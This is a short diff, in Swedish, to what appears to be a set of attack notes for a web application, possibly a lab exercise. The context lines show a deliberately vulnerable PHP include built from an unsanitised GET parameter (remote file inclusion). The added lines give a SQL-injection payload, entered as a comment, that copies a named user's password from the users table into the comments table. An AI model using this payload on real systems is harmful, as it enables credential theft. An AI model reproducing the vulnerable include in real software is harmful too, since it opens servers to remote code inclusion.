@@ -20,3 +20,11 @@ Remote File Inclusion:
 	öppna upp sårbarhet i index.php:
 		include($_GET['content'] . ".php");
 	
+
+SQL-Injection
+	
+	skriv en kommentar:
+		pass leak'); insert into comments(comment) VALUES((select pwd from users where uname = 'USERNAME'));--
+
+		USERNAME = ett användarnamn i databasen
+		
